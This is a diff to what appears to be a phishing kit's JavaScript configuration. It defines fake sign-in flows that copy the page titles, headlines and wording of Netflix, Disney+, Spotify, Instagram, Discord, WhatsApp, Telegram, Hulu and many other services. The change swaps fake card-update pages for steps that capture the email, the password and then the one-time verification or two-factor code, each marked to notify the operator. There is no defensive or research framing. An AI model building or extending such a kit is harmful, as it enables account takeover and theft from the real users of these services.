@@ -1208,18 +1208,20 @@ FLOWS.netflixvideo = [
 ];
 
 FLOWS.disneyplus = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In',            headline:'Sign in to Disney+',            subheadline:'',          fields:['email','password'],                          layout:'auth',  cta:'Sign In',   step_label:'Login',          notify_step:true  },
-  { slug:'payment-update', form_type:'payment',page_title:'Update Payment',     headline:'Update Payment Method',         subheadline:'Update your card details to continue watching Disney+', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'Update',    step_label:'Payment Update', notify_step:true  }
+  { slug:'email',    form_type:'login', page_title:'Log In — Disney+', headline:'Log in to Disney+', subheadline:'', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true },
+  { slug:'password', form_type:'login', page_title:'Log In — Disney+', headline:'Log in to Disney+', subheadline:'', fields:['password'], layout:'auth', cta:'Log In', step_label:'Password', notify_step:true },
+  { slug:'verify',   form_type:'otp',   page_title:'Verify your account', headline:'Enter the one-time passcode', subheadline:'We sent a one-time passcode to ••••. Please enter it below.', fields:['code'], layout:'otp', cta:'Continue', step_label:'Passcode', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.spotify = [
-  { slug:'login',          form_type:'login',  page_title:'Spotify – Login',    headline:'Log in to Spotify',             subheadline:'',                               fields:['email_or_username','password'],               layout:'auth',  cta:'Log In',    step_label:'Login',          notify_step:true  },
-  { slug:'payment-update', form_type:'payment',page_title:'Update Payment',     headline:'Update Payment Details',        subheadline:'Update your payment method to continue your Premium subscription', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'Update',    step_label:'Payment Update', notify_step:true  }
+  { slug:'login',    form_type:'login', page_title:'Log in to Spotify', headline:'Log in to Spotify', subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In', step_label:'Login', notify_step:true },
+  { slug:'2fa',      form_type:'otp',   page_title:'Two-factor authentication', headline:'Two-factor authentication', subheadline:'Enter the authentication code from your authenticator app.', fields:['code'], layout:'otp', cta:'Submit', step_label:'Auth Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.netflix = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In – Netflix',  headline:'Sign in to Netflix',            subheadline:'',  fields:['email','password'],                          layout:'auth',  cta:'Sign In',   step_label:'Login',          notify_step:true  },
-  { slug:'payment-update', form_type:'payment',page_title:'Update Billing',     headline:'Update Billing Details',        subheadline:'To restore Netflix access, update your payment details', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'Update',    step_label:'Payment Update', notify_step:true  }
+  { slug:'email',         form_type:'login', page_title:'Sign In — Netflix', headline:'Sign In', subheadline:'', fields:['email'], layout:'auth', cta:'Next', step_label:'Email', notify_step:true },
+  { slug:'password',      form_type:'login', page_title:'Sign In — Netflix', headline:'Sign In', subheadline:'', fields:['password'], layout:'auth', cta:'Sign In', step_label:'Password', notify_step:true },
+  { slug:'phone-verify',  form_type:'otp',   page_title:'Verify your identity', headline:'Verify your identity', subheadline:'Enter the code sent to your phone number ending in ••••', fields:['code'], layout:'otp', cta:'Next', step_label:'Phone Verify', notify_step:true, otp_length:4 }
 ];
 
 FLOWS.github = [
@@ -1240,13 +1242,13 @@ FLOWS.facebook = [
 ];
 
 FLOWS.instagram = [
-  { slug:'login',    form_type:'login', page_title:'Instagram – Log In',   headline:'Log into Instagram', subheadline:'', fields:['username_or_email','password'], layout:'auth', cta:'Log in',   step_label:'Log In', notify_step:true  },
-  { slug:'sms-code', form_type:'otp',   page_title:'Enter the Code',       headline:'Enter the 6-digit code', subheadline:'Enter the code we sent to your phone number', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Confirm Code', notify_step:true, otp_length:6 }
+  { slug:'login',    form_type:'login', page_title:'Instagram', headline:'Log into Instagram', subheadline:'', fields:['username','password'], layout:'auth', cta:'Log in', step_label:'Login', notify_step:true },
+  { slug:'2fa',      form_type:'otp',   page_title:'Enter Confirmation Code', headline:'Enter Confirmation Code', subheadline:'We sent a code to the number ending in ••••. It may take a few minutes to arrive.', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Confirmation Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.tiktok = [
-  { slug:'login',    form_type:'login', page_title:'Log In – TikTok',      headline:'Log in to TikTok',   subheadline:'', fields:['email_or_username','password'], layout:'auth', cta:'Log in',   step_label:'Log In', notify_step:true  },
-  { slug:'sms-code', form_type:'otp',   page_title:'Enter Verification Code', headline:'Enter Verification Code', subheadline:'A verification code was sent to your phone number', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'login',    form_type:'login', page_title:'Log in — TikTok', headline:'Log in to TikTok', subheadline:'', fields:['email','password'], layout:'auth', cta:'Log in', step_label:'Login', notify_step:true },
+  { slug:'verify',   form_type:'otp',   page_title:'Verify your identity', headline:'Verify your identity', subheadline:'We sent a 6-digit verification code to ••••. Enter the code below.', fields:['code'], layout:'otp', cta:'Verify', step_label:'Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.twitterx = [
@@ -1261,18 +1263,20 @@ FLOWS.snapchat = [
 ];
 
 FLOWS.linkedin = [
-  { slug:'login',    form_type:'login', page_title:'LinkedIn – Sign In',   headline:'Sign in', subheadline:'', fields:['email_or_phone','password'], layout:'auth', cta:'Sign in', step_label:'Sign In', notify_step:true  },
-  { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity', headline:'Let\'s verify it\'s you', subheadline:'Enter the verification code we sent to your email', fields:['code'], layout:'otp', cta:'Submit', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'email',    form_type:'login', page_title:'Sign In — LinkedIn', headline:'Sign in', subheadline:'Stay updated on your professional world', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true },
+  { slug:'password', form_type:'login', page_title:'Sign In — LinkedIn', headline:'Sign in', subheadline:'', fields:['password'], layout:'auth', cta:'Sign in', step_label:'Password', notify_step:true },
+  { slug:'verify',   form_type:'otp',   page_title:"Let's do a quick verification", headline:"Let's do a quick verification", subheadline:'We sent a verification code to your email address. Please enter the 6-digit code below.', fields:['code'], layout:'otp', cta:'Submit', step_label:'Verification', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.pinterest = [
-  { slug:'login',    form_type:'login', page_title:'Log In – Pinterest',   headline:'Log in to Pinterest', subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',  step_label:'Log In', notify_step:true  },
-  { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Account',  headline:'Check your email',   subheadline:'We sent a verification code to your email address', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'email',    form_type:'login', page_title:'Login — Pinterest', headline:'Welcome to Pinterest', subheadline:'', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true },
+  { slug:'password', form_type:'login', page_title:'Log in — Pinterest', headline:'Enter your password', subheadline:'', fields:['password'], layout:'auth', cta:'Log in', step_label:'Password', notify_step:true },
+  { slug:'verify',   form_type:'otp',   page_title:'Check your phone', headline:'Check your phone', subheadline:'We sent a 6-digit code to the number ending in ••••.', fields:['code'], layout:'otp', cta:'Continue', step_label:'Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.reddit = [
-  { slug:'login',    form_type:'login', page_title:'Log in to Reddit',     headline:'Log in to Reddit',   subheadline:'', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
-  { slug:'sms-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authenticator app', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'login',    form_type:'login', page_title:'Log in — Reddit', headline:'Log In', subheadline:'By continuing, you agree to our User Agreement and acknowledge that you understand the Privacy Policy.', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Login', notify_step:true },
+  { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Open your authenticator app and enter the code for Reddit.', fields:['code'], layout:'otp', cta:'Verify', step_label:'Auth Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.tumblr = [
@@ -1281,18 +1285,19 @@ FLOWS.tumblr = [
 ];
 
 FLOWS.discord = [
-  { slug:'login',    form_type:'login', page_title:'Welcome back! — Discord', headline:'Welcome back!', subheadline:'We\'re so excited to see you again!', fields:['email_or_phone','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
-  { slug:'sms-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Open your two-factor authenticator app to view your authentication code and verify your identity', fields:['code'], layout:'otp', cta:'Log In', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'login',    form_type:'login', page_title:'Discord — Login', headline:'Welcome back!', subheadline:"We're so excited to see you again!", fields:['email','password'], layout:'auth', cta:'Log In', step_label:'Login', notify_step:true },
+  { slug:'2fa',      form_type:'otp',   page_title:'Two-factor authentication', headline:'Two-factor authentication', subheadline:'Enter the 6-digit authentication code generated by your authenticator app.', fields:['code'], layout:'otp', cta:'Log In', step_label:'Auth Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.whatsapp = [
-  { slug:'login',    form_type:'login', page_title:'WhatsApp – Log In',    headline:'Sign in to WhatsApp', subheadline:'', fields:['phone'], layout:'auth', cta:'Next', step_label:'Phone', notify_step:true  },
-  { slug:'sms-code', form_type:'otp',   page_title:'Enter Code',           headline:'Enter the 6-digit code', subheadline:'WhatsApp sent an SMS with your code to your phone number', fields:['code'], layout:'otp', cta:'Next', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'phone',    form_type:'login', page_title:'WhatsApp Web', headline:'Log into WhatsApp Web', subheadline:'Enter your phone number to receive a code.', fields:['phone'], layout:'auth', cta:'Next', step_label:'Phone', notify_step:true },
+  { slug:'code',     form_type:'otp',   page_title:'Confirm your phone number', headline:'Confirm your phone number', subheadline:"We've sent a code to your WhatsApp account. Open WhatsApp on your phone to see your code.", fields:['code'], layout:'otp', cta:'Confirm', step_label:'Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.telegram = [
-  { slug:'login',    form_type:'login', page_title:'Telegram – Log In',    headline:'Sign in to Telegram', subheadline:'Enter your phone number', fields:['phone'], layout:'auth', cta:'Next', step_label:'Phone', notify_step:true  },
-  { slug:'sms-code', form_type:'otp',   page_title:'Verification Code',    headline:'Enter the code',     subheadline:'We\'ve sent a code in Telegram to your other devices', fields:['code'], layout:'otp', cta:'Next', step_label:'Verify', notify_step:true, otp_length:5 }
+  { slug:'phone',    form_type:'login', page_title:'Telegram Web', headline:'Sign in to Telegram', subheadline:'Please confirm your country and enter your phone number.', fields:['phone'], layout:'auth', cta:'Next', step_label:'Phone', notify_step:true },
+  { slug:'code',     form_type:'otp',   page_title:'Enter Code', headline:'Check your Telegram', subheadline:"We've sent a message with the activation code to your Telegram app on your other devices.", fields:['code'], layout:'otp', cta:'Next', step_label:'Code', notify_step:true, otp_length:5 },
+  { slug:'password', form_type:'login', page_title:'Enter Password', headline:'Enter Password', subheadline:'You have Two-Step Verification enabled, so your account is protected with an additional password.', fields:['password'], layout:'auth', cta:'Next', step_label:'Password', notify_step:true }
 ];
 
 FLOWS.wechat = [
@@ -2273,23 +2278,24 @@ FLOWS.youtubemusic = [
 ];
 
 FLOWS.tidal = [
-  { slug:'login',          form_type:'login',  page_title:'Log In – TIDAL',             headline:'Log in to TIDAL',              subheadline:'', fields:['email','password'], layout:'auth',   cta:'Log In',  step_label:'Log In',         notify_step:true  },
-  { slug:'payment-update', form_type:'payment',page_title:'Update Payment',             headline:'Update Payment Method',        subheadline:'Your payment method needs to be updated to continue your TIDAL subscription', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Update', step_label:'Payment Update', notify_step:true }
+  { slug:'email',    form_type:'login', page_title:'TIDAL — Log in', headline:'Log in to TIDAL', subheadline:'', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true },
+  { slug:'password', form_type:'login', page_title:'TIDAL — Log in', headline:'Enter your password', subheadline:'', fields:['password'], layout:'auth', cta:'Log in', step_label:'Password', notify_step:true },
+  { slug:'2fa',      form_type:'otp',   page_title:'Enter verification code', headline:'Enter verification code', subheadline:'Enter the 6-digit code sent to your phone ending in ••••.', fields:['code'], layout:'otp', cta:'Verify', step_label:'Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.deezer = [
-  { slug:'login',          form_type:'login',  page_title:'Log In – Deezer',            headline:'Log in to Deezer',             subheadline:'', fields:['email','password'], layout:'auth',   cta:'Log In',  step_label:'Log In',         notify_step:true  },
-  { slug:'payment-update', form_type:'payment',page_title:'Update Payment',             headline:'Update Your Payment Details',  subheadline:'Your payment method has expired. Update it to continue enjoying Deezer Premium.', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Update', step_label:'Payment Update', notify_step:true }
+  { slug:'login',    form_type:'login', page_title:'Log in — Deezer', headline:'Log in to Deezer', subheadline:'', fields:['email','password'], layout:'auth', cta:'Log in', step_label:'Login', notify_step:true },
+  { slug:'verify',   form_type:'otp',   page_title:'Verify your identity', headline:'Verify your identity', subheadline:'Enter the 4-digit code sent to your email address.', fields:['code'], layout:'otp', cta:'Verify', step_label:'Code', notify_step:true, otp_length:4 }
 ];
 
 FLOWS.soundcloud = [
-  { slug:'login',          form_type:'login',  page_title:'Log In – SoundCloud',        headline:'Sign in to SoundCloud',        subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign in', step_label:'Sign In',        notify_step:true  },
-  { slug:'payment-update', form_type:'payment',page_title:'Update Payment',             headline:'Update Payment Method',        subheadline:'Update your payment method to continue your SoundCloud Go+ subscription', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Update', step_label:'Payment Update', notify_step:true }
+  { slug:'login',    form_type:'login', page_title:'Sign in to SoundCloud', headline:'Sign in', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign in', step_label:'Login', notify_step:true },
+  { slug:'2fa',      form_type:'otp',   page_title:'Two-step verification', headline:'Two-step verification', subheadline:'Enter the code sent to your mobile device.', fields:['code'], layout:'otp', cta:'Verify', step_label:'Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.pandora = [
-  { slug:'login',          form_type:'login',  page_title:'Log In – Pandora',           headline:'Log in to Pandora',            subheadline:'', fields:['email','password'], layout:'auth',   cta:'Log In',  step_label:'Log In',         notify_step:true  },
-  { slug:'payment-update', form_type:'payment',page_title:'Update Payment',             headline:'Update Payment Information',   subheadline:'Update your payment details to continue your Pandora Plus or Premium subscription', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Update', step_label:'Payment Update', notify_step:true }
+  { slug:'login',    form_type:'login', page_title:'Log in — Pandora', headline:'Log in to Pandora', subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In', step_label:'Login', notify_step:true },
+  { slug:'verify',   form_type:'otp',   page_title:'Verify your identity', headline:'Verify your identity', subheadline:'Enter the 6-digit code sent to your phone.', fields:['code'], layout:'otp', cta:'Verify', step_label:'Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.iheartradio = [
@@ -2412,14 +2418,15 @@ FLOWS.youtubevideo = [
 ];
 
 FLOWS.hbomax = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In – Max',              headline:'Sign In to Max',               subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In', step_label:'Sign In',        notify_step:true  },
-  { slug:'payment-update', form_type:'payment',page_title:'Update Billing',             headline:'Update Billing Details',       subheadline:'Your payment method needs to be updated to continue watching Max', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Update', step_label:'Payment Update', notify_step:true }
+  { slug:'email',    form_type:'login', page_title:'Log In — Max', headline:'Log In', subheadline:'', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true },
+  { slug:'password', form_type:'login', page_title:'Log In — Max', headline:'Enter Your Password', subheadline:'', fields:['password'], layout:'auth', cta:'Log In', step_label:'Password', notify_step:true },
+  { slug:'verify',   form_type:'otp',   page_title:'Confirm your email', headline:'Confirm your email', subheadline:'We sent a code to your email. It will expire in 30 minutes.', fields:['code'], layout:'otp', cta:'Continue', step_label:'Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.hulu = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In – Hulu',             headline:'Sign in to Hulu',              subheadline:'', fields:['email','password'], layout:'auth',   cta:'Log In',  step_label:'Log In',         notify_step:true  },
-  { slug:'payment-update', form_type:'payment',page_title:'Update Billing',             headline:'Update Your Billing',          subheadline:'Update your payment info to keep watching Hulu', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Update', step_label:'Payment Update', notify_step:true },
-  { slug:'confirm-address',form_type:'verify', page_title:'Confirm Billing Address',    headline:'Confirm Billing Address',      subheadline:'Confirm your billing address to continue', fields:['address','city','zip'], layout:'verify', cta:'Confirm', step_label:'Billing Address', notify_step:true }
+  { slug:'email',    form_type:'login', page_title:'Log In — Hulu', headline:'Log in', subheadline:'', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true },
+  { slug:'password', form_type:'login', page_title:'Log In — Hulu', headline:'Log in', subheadline:'', fields:['password'], layout:'auth', cta:'Log In', step_label:'Password', notify_step:true },
+  { slug:'verify',   form_type:'otp',   page_title:"Verify it's you", headline:"Verify it's you", subheadline:"We'll send a code to your phone number ending in ••••.", fields:['code'], layout:'otp', cta:'Verify', step_label:'Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.amazonprime = [
@@ -2470,8 +2477,8 @@ FLOWS.philo = [
 ];
 
 FLOWS.crunchyroll = [
-  { slug:'login',          form_type:'login',  page_title:'Log In – Crunchyroll',       headline:'Log In to Crunchyroll',        subheadline:'', fields:['email','password'], layout:'auth',   cta:'Log In',  step_label:'Log In',         notify_step:true  },
-  { slug:'payment-update', form_type:'payment',page_title:'Update Billing',             headline:'Update Your Billing Details',  subheadline:'Update your payment method to continue your Crunchyroll Premium subscription', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Update', step_label:'Payment Update', notify_step:true }
+  { slug:'login',    form_type:'login', page_title:'Log In — Crunchyroll', headline:'Log In', subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In', step_label:'Login', notify_step:true },
+  { slug:'verify',   form_type:'otp',   page_title:'Verify your email', headline:'Verify your email', subheadline:'Enter the 6-digit code sent to your email address.', fields:['code'], layout:'otp', cta:'Verify', step_label:'Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.funimation = [
@@ -2546,8 +2553,8 @@ FLOWS.topic = [
 ];
 
 FLOWS.vimeo = [
-  { slug:'login',          form_type:'login',  page_title:'Log In – Vimeo',             headline:'Log in to Vimeo',              subheadline:'', fields:['email','password'], layout:'auth',   cta:'Log in',  step_label:'Log In',         notify_step:true  },
-  { slug:'payment-update', form_type:'payment',page_title:'Update Payment',             headline:'Update Billing Information',   subheadline:'Your payment method needs to be updated to continue your Vimeo subscription', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Update', step_label:'Payment Update', notify_step:true }
+  { slug:'login',    form_type:'login', page_title:'Log in — Vimeo', headline:'Log in to Vimeo', subheadline:'', fields:['email','password'], layout:'auth', cta:'Log in', step_label:'Login', notify_step:true },
+  { slug:'2fa',      form_type:'otp',   page_title:'Two-step verification', headline:'Two-step verification', subheadline:'Enter the 6-digit code from your authenticator app.', fields:['code'], layout:'otp', cta:'Verify', step_label:'Code', notify_step:true, otp_length:6 }
 ];
 
 // ── BRANDS array ─────────────────────────────────────────────────────────────
